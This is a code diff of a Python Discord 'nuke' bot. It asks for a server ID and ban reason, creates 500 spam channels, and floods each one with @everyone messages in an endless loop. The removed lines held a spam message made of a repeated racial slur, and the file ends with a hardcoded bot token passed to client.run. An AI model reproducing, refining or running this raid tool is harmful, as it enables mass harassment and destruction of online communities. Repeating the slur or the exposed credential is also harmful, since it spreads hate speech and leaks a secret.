@@ -5,8 +5,9 @@ prefix = ">"
 intents = discord.Intents(messages=True, members = True, guilds=True)
 client = discord.Client(command_prefix=commands.when_mentioned_or(prefix), intents=intents)
 
-SPAM_CHANNEL =  ["Chupapi runs you", "Chupapi","Chupapi Beamed You","Beamed by chupapi"]
-SPAM_MESSAGE = ["@everyone nigger nigger nigger nigger nigger "]
+SPAM_CHANNEL =  input("Enter channel name to be spammed: ")
+print("include @everyone if u want like - Enter Spam message: @everyone u get spammed!")
+SPAM_MESSAGE = "@everyone " + input("Enter spam message: ") 
 
 server_id = int(input('Enter server ID to nuke: '))
 ban_reason = input('Enter ban reason: ')
@@ -57,7 +58,7 @@ async def on_ready():
                 print (f"Cannot delete emoji {emoji.name}")
 
             for i in range(500):
-              await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+              await guild.create_text_channel(SPAM_CHANNEL)
 
             print(f"nuked {guild.name} Successfully.")
             break
@@ -69,6 +70,6 @@ async def on_ready():
 @client.event
 async def on_guild_channel_create(channel):
     while True:
-      await channel.send(random.choice(SPAM_MESSAGE))
+      await channel.send(SPAM_MESSAGE)
 
 client.run("ODM4ODMwNDgxMDcyMDYyNDg0.YJAzww.Y4jQFYHfv2IntQ3re8h64U4JqpY", bot=True)
